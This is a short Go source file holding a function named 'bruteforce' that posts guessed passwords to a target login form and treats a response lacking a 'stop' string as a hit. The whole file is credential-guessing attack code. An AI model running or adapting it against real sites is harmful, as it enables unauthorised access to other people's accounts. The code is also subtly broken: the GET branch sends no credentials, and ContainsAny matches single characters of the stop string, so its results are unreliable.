package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"

	"golang.org/x/net/html/charset"
)

func bruteforce(
	target string,
	method string,
	login string,
	password string,
	loginField string,
	passwordField string,
	stop string,
) string {
	var response *http.Response
	var err error
	if method == "POST" {
		data := url.Values{}
		data.Set(loginField, login)
		data.Set(passwordField, password)
		response, err = http.PostForm(target, data)
	}
	if method == "GET" {
		response, err = http.Get(target)
	}
	if err != nil {
		return ""
	}
	if response == nil {
		return fmt.Sprintf("Error response with password %s", password)
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return fmt.Sprintf("Error status code: %d with password %s", response.StatusCode, password)
	}
	responseText, _ := charset.NewReader(response.Body, response.Header.Get("Content-type"))
	text, _ := ioutil.ReadAll(responseText)
	if strings.ContainsAny(string(text), stop) {
		return ""
	}
	return password
}
